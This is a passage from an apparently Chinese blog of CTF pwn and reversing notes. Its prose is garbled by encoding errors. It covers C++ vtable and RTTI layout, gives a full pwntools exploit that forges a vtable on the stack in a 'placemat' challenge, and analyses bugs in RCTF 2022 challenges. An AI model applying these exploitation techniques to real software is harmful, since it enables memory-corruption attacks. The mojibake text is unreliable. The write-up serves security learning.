href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class#:~:text=Now%2C%20in%20fact%2C%20the%20story%20is%20somewhat%20more%20complicated.">è§£é‡Š</a>  </p><blockquote><p>æ„é€ å‡½æ•°å¯ä»¥ä¸ä¸€æ ·: è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­, å¦‚æœå‡ºç°äº†Childçš„å®šä¹‰, ä½†æ˜¯è¿˜å‡ºç°äº†Parentçš„å®šä¹‰, å°±ä¼šæœ‰ä¸¤ä¸ªParentæ„é€ å‡½æ•°,ä¸€ä¸ªåªç”¨åœ¨Child::Child()ä¸­, å¦ä¸€ä¸ªç”¨åœ¨Parentè‡ªèº«çš„æ„é€ ä¹‹ä¸­. ä¹Ÿæ˜¯æ‰€è°“çš„in or not in charge constructor</p></blockquote><ul><li>An â€œin-chargeâ€ (or complete object) constructor is one that constructs virtual bases,<br>and a â€œnot-in-chargeâ€ (or base object) constructor is one that does not.</li><li>å—¯, ä¸æƒ³çœ‹äº†. è¿˜æœ‰ä¸€äº›destructorçš„ä¸œè¥¿. </li></ul></li><li><p>å¤šé‡ç»§æ‰¿æ—¶vtableæœ€åçš„æ˜¯VTT, ä¹Ÿå°±æ˜¯vtableçš„table. </p></li></ul><h4 id="RTTI"><a href="#RTTI" class="headerlink" title="RTTI:"></a><strong>RTTI</strong>:</h4><ul><li>The typeid operator produces a <strong>reference</strong> to a std::type_info structure with the following public interface</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"> <span class="hljs-keyword">namespace</span> std &#123;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">type_info</span> &#123;</span><br>     <span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">type_info</span>();<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>!=(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">before</span><span class="hljs-params">(<span class="hljs-keyword">const</span> type_info &amp;)</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>     <span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">type_info</span> (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>type_info&amp; <span class="hljs-keyword">operator</span>= (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>   &#125;;<br> &#125;<br></code></pre></div></td></tr></table></figure><ul><li>é™¤äº†æŒ‡å‘ä¸å®Œå…¨ç±»å‹çš„ç›´æ¥æˆ–é—´æ¥æŒ‡é’ˆå¤–ï¼Œç›¸ç­‰å’Œä¸ç­‰æ“ä½œç¬¦åœ¨æ“ä½œtype_infoå¯¹è±¡æ—¶å¯ä»¥å†™æˆåœ°å€æ¯”è¾ƒ:ä¸¤ä¸ªtype_infoç»“æ„ä½“å½“ä¸”ä»…å½“å®ƒä»¬æ˜¯ç›¸åŒçš„ç»“æ„ä½“(åœ¨ç›¸åŒçš„åœ°å€)æ—¶ï¼Œå®ƒä»¬æè¿°çš„æ˜¯ç›¸åŒçš„ç±»å‹ã€‚</li><li>layout<ul><li><code>abi::__class_type_info</code> is used for class types having no bases, and is also a base type for the other two class type representations.</li><li>ä¸çœ‹äº†. </li></ul></li><li><a href="https://bbs.pediy.com/thread-268094.htm">çœ‹é›ªblog</a> </li></ul><hr><h3 id="BIN"><a href="#BIN" class="headerlink" title="BIN"></a>BIN</h3><p>çœŸçš„ä¼šç´¯æ­». å›è¿‡å¤´æ¥ä¸€çœ‹typeidä¹Ÿå°±æ˜¯è¿™ä¹ˆç‚¹ä¸œè¥¿: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> __cdecl <span class="hljs-built_in">std</span>::type_info::<span class="hljs-keyword">operator</span>==(<span class="hljs-built_in">std</span>::type_info *a1, <span class="hljs-built_in">std</span>::type_info *a2)<br>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">std</span>::__is_constant_evaluated() )<br>    <span class="hljs-keyword">return</span> a1 == a2;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)a1 + <span class="hljs-number">1</span>) == *((_DWORD *)a2 + <span class="hljs-number">1</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( **((_BYTE **)a1 + <span class="hljs-number">1</span>) == <span class="hljs-number">42</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v3 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)<span class="hljs-built_in">std</span>::type_info::name(a2);<br>  <span class="hljs-keyword">return</span> !<span class="hljs-built_in">strcmp</span>(*((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)a1 + <span class="hljs-number">1</span>), v3);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¬¬äºŒä¸ªifç›´æ¥æ¯”è¾ƒçš„æ˜¯demangled name. ä½†æ˜¯ç®€å•çš„ä¿®æ”¹æŒ‡é’ˆä¸ºBotè™šè¡¨ä¼šå¯¼è‡´æ‰§è¡ŒBot::taketurnå¯¹è±¡å‡½æ•°. æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ªé€ æ•´ä¸ªè™šè¡¨,å°±åœ¨æ ˆä¸Š, æ‰€ä»¥æ‰éœ€è¦leakæ ˆæŒ‡é’ˆ. è¿™ä¸ªä¿®æ”¹å‘ç”Ÿåœ¨ç¬¬äºŒå±€, æ­¤æ—¶è¿›å…¥çš„æ˜¯Game::Multiplayer(), å°±ç®—ç ´åcanaryä¹Ÿæ²¡æœ‰å…³ç³», èƒ½å¤Ÿåœ¨Game::play()å‡½æ•°é‡Œæ‰§è¡Œcongratulateå°±å¯ä»¥äº†. </p><blockquote><p>å—¯, éœ€ä¸éœ€è¦å››å­—èŠ‚å¯¹é½? å¥½å§æ ˆä¸Šçš„ä¸œè¥¿å·²ç»æ˜¯å¯¹é½çš„äº†, åªè¦ä»nameå¼€å¤´å°±å¯ä»¥. </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.rodata:0804C35C                 dd 0                    ; offset to this<br>.rodata:0804C360                 dd offset _ZTI5Human    ; `typeinfo for&#x27;Human<br>.rodata:0804C364 off_804C364     dd offset _ZN5HumanD2Ev ; DATA XREF: Human::Human(void)+15â†‘o<br>.rodata:0804C364                                         ; Human::~Human()+6â†‘o<br>.rodata:0804C364                                         ; Human::~Human()<br>.rodata:0804C368                 dd offset sub_804AEF2<br>.rodata:0804C36C                 dd offset requestName<br>.rodata:0804C370                 dd offset Human__takeTurn<br><br>.rodata:0804C1D4 ; `typeinfo for&#x27;Bot<br>.rodata:0804C1D4 _ZTI3Bot        dd offset unk_804EEC8   ; DATA XREF: sub_804AA96+8Câ†‘o<br>.rodata:0804C1D4                                         ; .rodata:0804C1A8â†‘o<br>.rodata:0804C1D8                 dd offset a3bot         ; &quot;3Bot&quot;<br>.rodata:0804C1DC                 dd offset off_804C1E8<br></code></pre></div></td></tr></table></figure><p>ä¼ªé€ æˆä¸Šé¢è¿™ä¸ªæ ·å­, é™¤äº†typeinfoéƒ¨åˆ†è¦æ¢æˆBotçš„typeinfoåœ°å€. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr])<br>pl2 = flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF18</span>, <span class="hljs-number">0x804AF4E</span>])<br></code></pre></div></td></tr></table></figure><p>æ³¨æ„Game classæ²¡æœ‰è™šè¡¨æŒ‡é’ˆ, ä¸è¦çœ‹å¤šäº†å°±çœ‹ä»€ä¹ˆéƒ½æ˜¯è™šè¡¨. </p><p>å¥½å§è¿™æ ·ä¸è¡Œ, å¿½ç•¥äº†åé¢ç´§è·Ÿç€çš„Game. ä¼šè¢«<strong>è¦†ç›–</strong>.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&#x27;./placemat&#x27;</span><br>p = process(<span class="hljs-string">&quot;./placemat&quot;</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;yog&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>ru(<span class="hljs-string">b&quot;b&quot;</span> * <span class="hljs-number">20</span>)<br>stack_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>p2_name_addr = stack_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span><br><br>log.success(<span class="hljs-string">f&#x27;leak value: 0x<span class="hljs-subst">&#123;stack_addr:x&#125;</span>&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(e.g. A3): &quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>pl1 = flat([<span class="hljs-string">b&#x27;yog&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>), p2_name_addr+<span class="hljs-number">20</span>+<span class="hljs-number">48</span>+<span class="hljs-number">4</span>])<br><span class="hljs-comment"># ä¸€ä¸²\x00å°±æ˜¯ä¸ºäº†è·³è¿‡Game classçš„å†…å­˜. </span><br>pl2 = flat([<span class="hljs-string">b&#x27;fake_bot&#x27;</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">20</span>+<span class="hljs-number">48</span>-<span class="hljs-number">8</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x804C1D4</span>, <span class="hljs-number">0x804AED0</span>, <span class="hljs-number">0x804AEF2</span>, <span class="hljs-number">0x804AF4E</span>, <span class="hljs-number">0x804AF4E</span>])<br><br>ru(<span class="hljs-string">b&quot;3 Exit\n&quot;</span>)<br>sl(<span class="hljs-string">b&quot;1&quot;</span>)<br>ru(<span class="hljs-string">b&quot;(h)uman? &quot;</span>)<br>sl(<span class="hljs-string">b&quot;h&quot;</span>)<br>ru(<span class="hljs-string">b&quot;Player 1: &quot;</span>)<br>sl(pl1)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#gdb.attach(p, &#x27;b *0x804AA96\nc&#x27;)</span><br><span class="hljs-comment">#input(&#x27;wait for gdb&#x27;)</span><br>ru(<span class="hljs-string">b&quot;Player 2: &quot;</span>)<br>sl(pl2)<br><br>sl(<span class="hljs-string">b&quot;A1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B1&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;B2&quot;</span>)<br>sl(<span class="hljs-string">b&quot;A3&quot;</span>)<br><br>itt()<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªexpçš„é—®é¢˜æ˜¯ç”±äºå…ˆæ‰‹æ˜¯éšæœºçš„ä½†æ˜¯å¹¶æœªæ£€æµ‹å…ˆæ‰‹, å¯¼è‡´ä¸€åŠæ¦‚ç‡è¾¾ä¸åˆ°æƒ³è¦çš„ç»“æœ. å¤šè¯•ä¸¤æ¬¡æˆ–è€…å†å†™ä¸ªå¤§å¾ªç¯catch exception. </p><h1 id="RCTF-2022"><a href="#RCTF-2022" class="headerlink" title="RCTF 2022"></a>RCTF 2022</h1><h2 id="general-wp"><a href="#general-wp" class="headerlink" title="general wp"></a>general wp</h2><ul><li>RCTF 2022 writeup by W&amp;M <a href="https://blog.wm-team.cn/index.php/archives/35/">https://blog.wm-team.cn/index.php/archives/35/</a> </li><li>RCTF 2022 pwn bfc offical wp <a href="https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc">https://github.com/no1rr/RCTF2022/tree/master/pwn_bfc</a> </li><li>RCTF 2022 bfc wp <a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc</a> </li><li>RCTF2022 wp by b3f0re  <a href="https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md">https://github.com/b3f0re-team/Write-up/blob/main/RCTF/RCTF.md</a> </li><li>RCTF 2022 Official Writeup - Crypto Part <a href="https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part">https://hackmd.io/@GowLxW7-TTGIMIQqhgOUlw/H1_a_rHOi#RCTF-Official-Writeup---Crypto-Part</a> </li><li>RCTF 2022 writeup by Nu1L [233](<a href="https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF">https://files.zsxq.com/Fkki7qyvZEuZ2ot5DMTVrpzI5zL-?attname=RCTF</a> WriteUp By Nu1L.pdf&amp;e=1670928565&amp;token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mB8kQYKlYDn-S3ySMDt9Dt9P1L8=) </li><li>RCTF2022-MyCarsShowSpeed Writeup <a href="https://bbs.pediy.com/thread-275512.htm">https://bbs.pediy.com/thread-275512.htm</a></li><li>OFFICIAL WP <a href="https://blog.rois.io/2022/rctf-2022-official-write-up/">https://blog.rois.io/2022/rctf-2022-official-write-up/</a></li></ul><h2 id="MyCarShowSpeed"><a href="#MyCarShowSpeed" class="headerlink" title="MyCarShowSpeed"></a>MyCarShowSpeed</h2><ul><li><p>New a Game</p><ul><li>stability, performance. çœŸçœ‹ä¸å‡ºæ¥æ¼æ´â€¦..</li></ul></li><li><p>Show Information</p><ul><li>â€¦.</li></ul></li><li><p>Visit The Store</p><ul><li><p>Buy Goods: </p><ul><li>SuperTireæ²¡æœ‰ä¸€ç‚¹æ•ˆæœ. ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å«ä¹‰å‘¢. </li><li>æœ‰é’±ä¹°flagä¹‹åä½†æ˜¯wintimesè¿‡å°‘ä¼šè§¦å‘æ²¡æ”¶è½¦è¾†. æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹?</li></ul><p>**è¿˜çœŸæœ‰ç‰¹åˆ«çš„åœ°æ–¹, å›è¿‡å¤´æ¥çœ‹å¾ˆæ˜æ˜¾å¯ä»¥å…ˆfix carä»carlistä¸Šåˆ é™¤è¯¥è½¦ä¹‹å(å…±æ‹¥æœ‰ä¸¤è¾†è½¦ä»¥ä¸Š), å†æ¥ä¹°flag, ç›´æ¥æŠŠå‰©ä¸‹çš„ä¹Ÿåˆ æ‰äº†, carNumå½’é›¶. ** </p><ul><li>æ²¡çœ‹å‡ºæ¥â€¦â€¦</li></ul></li><li><p>Sell Goods:</p><ul><li>åœ¨é“¾è¡¨ä¸Šç›´æ¥æŠŠæŒ‡é’ˆç½®ç©ºå½“åšæ˜¯åˆ é™¤äº†è½¦è¾†. å¹¶æ²¡æœ‰åˆ é™¤èŠ‚ç‚¹. </li></ul></li><li><p>Fix Cars</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">car-&gt;fixTime = time(<span class="hljs-literal">NULL</span>);<br>car-&gt;fixed = <span class="hljs-number">1</span>;<br>_this-&gt;carList-&gt;addCar(car, _this-&gt;carList);<br>_this-&gt;carList-&gt;carNums++;<br><span class="hljs-keyword">if</span>(carList-&gt;carNums &gt; <span class="hljs-number">1</span>)<br>&#123;<br>    car-&gt;isTaken = <span class="hljs-number">1</span>;<br>    carList-&gt;deleteCar(car, &amp;carList);<br>    carList-&gt;carNums--;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We will temporily take your car and fix it soon!&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK! We&#x27;ll soon fix it!&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>æ‰€æœ‰çš„è½¦å¤§äºä¸€è¾†æ—¶å°±ä¼šä»è½¦åº“ä¸­(<code>carList</code>)åˆ é™¤è¿™è¾†è½¦. è€Œä¸ä»…ä»…æ˜¯fixedå˜æˆ1. </p></li><li><p>Fetch Cars</p><ul><li>æ•´æ•°æº¢å‡ºé”™è¯¯</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">fixDifficulty = car-&gt;fixDifficulty;<br>fixedTime = fixDifficulty * time(<span class="hljs-number">0LL</span>) - car-&gt;fixTime;<br>cost = (<span class="hljs-keyword">int</span>)(<span class="hljs-number">0.1</span> * (<span class="hljs-keyword">double</span>)(<span class="hljs-keyword">int</span>)fixedTime) + <span class="hljs-number">5</span>;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºtime()è¿”å›çš„å·¨å¤§æ—¶é—´æˆ³å€¼ä¹˜ä»¥fixDifficultyåä¼šæº¢å‡º, è€Œç»“æœä½¿ç”¨intç±»å‹, é€ æˆæº¢å‡ºä¸ºè´Ÿæ•°. æµ‹äº†ä¸‹åªè¦ç¬¬äºŒæ¬¡å°±å¯ä»¥. </p><img src="../../image/recent_ctf/image-20230101151729612.png" alt="image-20230101151729612" style="zoom: 80%;" /></li></ul><ol start="5"><li>Leave</li></ol></li><li><p>Switch Cars</p></li><li><p>Rules</p></li></ul><ol start="6"><li>Quit</li></ol><p>?????????????????????????????????????????é‰´å®šä¸ºçƒ‚, æ ¹æœ¬ä¸çŸ¥é“å“ªä¸ªæ–‡ä»¶æ˜¯è¿œç¨‹ç¯å¢ƒä½¿ç”¨çš„, è¢«æ•´æ™•äº†, ä¸åšäº†. æœ¬è´¨æ˜¯tcacheåˆ©ç”¨.</p><img src="../../image/recent_ctf/image-20230101233406596.png" alt="image-20230101233406596" style="zoom:80%;" /><h2 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h2><blockquote><p>C++é€†å‘. çœ‹åˆ°äº†std::stringå’Œstd::mapçš„é€†å‘ä»£ç . å¦‚æœè¦çœ‹æ‡‚åº”è¯¥è¦æ‰¾æ‰¾stlçš„é€†å‘æ•™ç¨‹.</p></blockquote><ul><li><strong><a href="https://bbs.pediy.com/thread-270547.htm">æµ…è°ˆSTLå®¹å™¨è¯†åˆ«</a></strong> (æ³¨æ„é“¾æ¥æ˜¯MSVCç‰ˆæœ¬, GNUç‰ˆæœ¬åœ¨ä¸‹æ–¹)</li></ul><p>å¼€è¯¾äº†, C++åŸºç¡€ç­. çœ‹äº†å‡ ä¸ªæ·±è“è‰²çš„é“¾æ¥, æ·±æ„ŸçŸ¥è¯†åŒ®ä¹å•Š, çœŸä¸æ„§æ˜¯C++.</p><img src="../../image/recent_ctf/image-20230102183226852.png" alt="image-20230102183226852" style="zoom:33%;" /><ul><li><p><a href="https://en.cppreference.com/w/cpp/language/using_declaration">using statement</a>. can be used to introduce a member of base class into derived class definition. </p></li><li><p><a href="https://en.cppreference.com/w/cpp/keyword/typename">typename keyword</a> :  Inside a declaration or a definition of a template, typename can be used to declare that a <a href="https://en.cppreference.com/w/cpp/language/dependent_name">dependent qualified name</a> is a type.</p><p><strong>then, what is qualified name??</strong>  </p><ul><li>A qualified name may refer to a<ul><li>class member (including static and non-static functions, types, templates, etc)</li><li>namespace member (including another namespace)</li><li>enumerator</li></ul></li><li>For an <em>unqualified</em> name, that is a name that does not appear to the right of a scope resolution operator <strong><code>::</code></strong>, name lookup sequence depend on reference position(such as global, in namespace, Non-member function definition, etc.)</li></ul><p><strong>finally, what is the word <em>dependent</em> ?</strong> </p><ul><li>not determined by template arguments. </li></ul></li><li><p>æ‰€ä»¥, STLæºç ä¸­classå†…éƒ¨çš„<code>using _Nodeptr = typename _Val_types::_Nodeptr;</code>ä¹Ÿå°±å¯ä»¥ç†è§£äº†</p></li><li><p>mapå’Œset:</p><ul><li>ä½¿ç”¨çš„çº¢é»‘æ ‘: åœ¨æŸ¥è¯¢ä¸Šæœ€å¤šæ¯”å¹³è¡¡äºŒå‰æ ‘å¤šä¸€æ¬¡æŸ¥æ‰¾, ä½†æ˜¯åœ¨æ’å…¥å’Œåˆ é™¤çš„æ—¶å€™æ›´ä¸ºé«˜æ•ˆ, å› ä¸ºå…¶ä¸è¿½æ±‚å®Œå…¨çš„å¹³è¡¡, å‡å°‘äº†å¤§é‡çš„å¹³è¡¡æ€§è®¡ç®—.</li></ul></li></ul><p style="font-size:large;font-weight:bold"> å¾—å‡ºç»“è®º, MSVCä¼šå†…è”ä¸€äº›ä»£ç å¯¼è‡´çœ‹èµ·æ¥åˆ†ä¸æ¸…æ¥š, ä½†æ˜¯g++ç¼–è¯‘çš„è¯ä¼šå‡ºç°é»˜è®¤allocatorçš„å®šä¹‰åå†æ„é€ stringæˆ–è€…å¯¹åº”çš„å®¹å™¨, å·²ç»ç›¸å½“ç®€æ´äº†ä¸ç”¨åœ¨åŒºåˆ†å®¹å™¨ä¸Šè¿‡å¤šåˆ†æ</p><p>ä½†æ˜¯åœ¨é€†å‘æ–‡ä»¶æ—¶å‘ç°æœ‰ä¸å°‘å¥‡æ€ªå‡½æ•°, å¹¶æ²¡æœ‰æ‰¾åˆ°æ•™ç¨‹ä¹‹ç±»çš„ä¸œè¥¿, æœ‰ä¸€æœ¬RE4Bå‹‰å¼ºçœ‹çœ‹å§, å°±ä»è¿™é‡Œå…¥ä¸ªé—¨.</p><p>STLæºç ä¹Ÿä¸ä¸€å®šè¦çœ‹, ä¸»è¦æ˜¯ä»£ç å’Œåç¼–è¯‘å‡ºæ¥çš„ä¸œè¥¿çš„å¯¹åº”. æ³¨æ„åˆ°ä¸Šé¢é“¾æ¥ä¸­çš„æ˜¯msvcç‰ˆæœ¬çš„STL, è€ŒGNUçš„STLåœ¨ä¸‹é¢</p><p>link: <a href="https://leezw.net/assets/pdf/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.pdf">SGI-STL BOOK</a> | <a href="https://github.com/steveLauwh/SGI-STL">SGI_STL Repo</a> | <a href="https://github.com/arkingc/note/blob/master/C++/STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90.md">book note</a> | <a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/basic_string.h">GNU STL</a> | </p><h3 id="STL-REVERSING"><a href="#STL-REVERSING" class="headerlink" title="STL REVERSING"></a>STL REVERSING</h3><blockquote><p>å¾çˆ±æ‰¾çš„IDAçš„DWARFè§£æå‡ºé—®é¢˜, å¯¼è‡´æœ‰ç¬¦å·ç‰ˆç¤ºä¾‹æºç å˜é‡æ˜¾ç¤ºä¸å…¨, IDA FREEæ²¡æœ‰è¿™ä¸ªé—®é¢˜. æ˜å¤©é‡ä¸‹ä¸ªIDAçœ‹çœ‹. freeç‰ˆæœ¬çš„ä½¿ç”¨cloud decompilerå®åœ¨æœ‰ç‚¹æ…¢, ä¸è¿‡å€’ä¹Ÿèƒ½æ¥å—. </p></blockquote><h4 id="ç¤ºä¾‹ç”¨æºç "><a href="#ç¤ºä¾‹ç”¨æºç " class="headerlink" title="ç¤ºä¾‹ç”¨æºç :"></a>ç¤ºä¾‹ç”¨æºç :</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  map&lt;string, <span class="hljs-keyword">int</span>&gt; m;<br>  string fuckkey = <span class="hljs-string">&quot;fuck&quot;</span>;<br>  m[fuckkey] = <span class="hljs-number">1</span>;<br><br>  set&lt;<span class="hljs-keyword">int</span>&gt; s;<br>  s.<span class="hljs-built_in">insert</span>(<span 